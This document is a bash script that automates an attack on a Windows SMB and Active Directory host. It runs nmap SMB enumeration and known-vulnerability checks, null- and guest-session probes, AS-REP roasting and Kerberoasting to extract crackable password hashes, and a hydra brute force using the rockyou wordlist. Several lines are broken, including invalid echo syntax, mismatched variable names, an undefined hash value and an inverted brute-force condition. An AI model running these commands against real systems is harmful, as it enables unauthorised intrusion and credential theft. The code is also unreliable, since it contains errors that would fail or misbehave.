#!/bin/bash

#Argument Supplied Check
display_usage() { 
	echo -e "\nUsage: $0 <IP Address> options[<User Name> <Domain> <Password>]\n" 
	} 
# if less than X arguments supplied, display usage 
if [  $# -le 0 ] 
then 
	display_usage
	exit 1
fi 
 
# check whether user had supplied -h or --help . If yes display usage 
if [[ ( $@ == "--help") ||  $@ == "-h" ]] 
then 
	display_usage
	exit 0
fi 

# Variable Assignment
ip=$1
User=$2
Domain=$3
Pass=$4
cd $ip

mkdir SMB_Enum && cd SMB_Enum

# SMB enum scan
# Non Credential
#Enumeration
echo -e "\n===== RUNNING NON-CREDENTIAL SCAN =====\n"
nmap $ip --script=smb-enum* -p 445 -vvv > SMB_enum.out
echo "%%%" >> SMB_enum.out
nbtscan $ip >> SMB_enum.out
echo "%%%" >> SMB_enum.out
smbmap -H $ip >> SMB_enum.out
echo "%%%" >> SMB_enum.out
smbmap -H $ip -u null -p null >> SMB_enum.out
echo "%%%" >> SMB_enum.out
smbmap -H $ip -u guest >> SMB_enum.out
echo "%%%" >> SMB_enum.out
smbclient -N -L //$ip >> SMB_enum.out
echo "%%%" >> SMB_enum.out
smbclient -N //$ip/ --option="client min protocol"=LANMAN1 >> SMB_enum.out
echo "%%%" >> SMB_enum.out
#rpc auth without creds
rpcclient $ip
echo "%%%" >> SMB_enum.out
rpcclient -U "" $ip
echo "%%%" >> SMB_enum.out
# cme without creds
crackmapexec smb $ip
echo "%%%" >> SMB_enum.out
crackmapexec smb $ip --pass-pol -u "" -p ""
echo "%%%" >> SMB_enum.out
crackmapexec smb $ip --pass-pol -u "guest" -p ""
echo "%%%" >> SMB_enum.out
# more enum
GetADUsers.py -dc-ip $ip "{Domain_Name}/" -all >> SMB_enum.out
echo "%%%" >> SMB_enum.out
GetNPUsers.py -dc-ip $ip -request "{Domain_Name}/" -format hashcat >> SMB_enum.out
echo "%%%" >> SMB_enum.out
GetUserSPNs.py -dc-ip $ip -request "{Domain_Name}/" >> SMB_enum.out
echo "%%%" >> SMB_enum.out
getArch.py -target $ip >> SMB_enum.out
echo "%%%" >> SMB_enum.out
# run enum4linux to get General SMB info
enum4linux -a $ip
echo "%%%" >> SMB_enum.out
echo "%%%" >> SMB_enum.out

# Credential scan
echo -e "\n===== RUNNING CREDENTIAL SCAN =====\n"
if [  $# = 4 ] 
then  
	nmap $ip --script=smb-enum* --script-args smbusername=$user,smbpass=$pass -p 445 -vvv -o SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
	smbmap -H $ip -u $Pass -p $Pass >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
	smbclient "\\\\$ip\\\" -U $User -W $Domain -l $ip >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
	smbclient "\\\\$ip\\\" -U $User -W $Domain -l $ip --pw-nt-hash `hash` >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
	crackmapexec smb $ip -u $User -p $Pass --shares >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
	GetADUsers.py $Domain/$User:$Pass -all >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
	GetNPUsers.py $Domain/$User:$Pass -request -format hashcat >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
	GetUserSPNs.py $Domain/$User:$Pass -request >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
  	echo "%%%" >> SMB_credentialed_enum.out
else
	echo("no credential scan as credentials not provided") >> SMB_credentialed_enum.out
 	echo "%%%" >> SMB_credentialed_enum.out
  	echo "%%%" >> SMB_credentialed_enum.out
fi



# SMB nmap vuln scans
echo -e "\n===== RUNNING VULN SCAN =====\n"
nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse $ip
nmap -vv --script smb-vuln* -Pn -p 139,445 $ip

# Hydra bruitforse
if [  $# -le 1 ] 
then
	echo -e "\n===== RUNNING HYDRA BRUITFORCE=====\n"
	hydra -t 1 -V -f -l $User -P /usr/share/wordlists/rockyou.txt $ip smb
else
	echo("no user provided, plese use '-h' option to see usage")
fi

echo -e "\n********** FINISHED **********\n"
